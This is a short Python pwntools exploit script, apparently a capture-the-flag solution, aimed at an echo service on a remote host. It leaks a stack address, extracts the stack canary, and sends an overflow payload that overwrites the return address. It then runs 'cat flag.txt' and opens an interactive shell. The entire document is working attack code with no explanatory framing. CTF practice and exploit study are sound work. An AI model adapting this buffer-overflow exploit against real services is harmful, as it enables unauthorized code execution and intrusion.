#!/usr/bin/env python3
from pwn import *

# Connecting to remote
context(arch='amd64', os='linux')
r = remote('hackfest.redrocket.club', 1342)

r.recvline()                            # "Welcome to the echo service!"

# [1] Leaking an address
print('\n[1] Leaking address...')
payload = b'A'*24
r.send(payload)
leak = r.recvline()[24:-1]
addr = int.from_bytes(leak, 'little')
log.info(f'leaked:\t{hex(addr)}')
target = addr + 256                     # offset of 256
log.info(f'target:\t{hex(target)}')

# [2] grabbing canary
print('\n[2] Grabbing canary...')
payload = b'A'*40
r.sendline(payload)
r.recvline()
canary = r.recvline()[:-1]
canary = b'\x00' + canary
log.info(f'canary:\t{canary}')

# [3] crafting final payload
print("\n[3] Crafting final payload...")
payload = [
    b'B'*40,
    canary,
    b'A'*8,
    p64(target),
    b'\00'*2,
]
payload = bytearray().join(payload)
log.info(f'payload: {payload}')

# [4] grabbing flag
print("\n[4] Grabbing flag...")
r.sendline(payload)
r.sendline(b'\n')
r.recvline()                            # b'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\n'
r.sendline(b'\n')
r.recvline()                            # b'\n'
r.sendline(b'cat flag.txt')
log.info(f'see below\n\n')

r.interactive()
